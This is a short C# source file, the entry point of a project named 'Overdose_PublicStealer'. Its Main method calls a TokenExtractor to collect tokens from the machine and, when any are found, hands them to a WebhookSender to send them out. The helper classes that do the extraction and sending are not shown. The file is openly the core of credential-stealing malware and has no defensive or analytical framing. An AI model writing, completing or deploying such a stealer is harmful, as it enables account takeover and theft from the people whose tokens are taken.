using System;
using System.Collections.Generic;

namespace Overdose_PublicStealer
{
    internal static class Program
    {
        internal static void Main()
        {
            var tokens = TokenExtractor.GetTokens();
            if (tokens.Count > 0)
            {
                WebhookSender.SendTokens(tokens);
            }
        }
    }
}
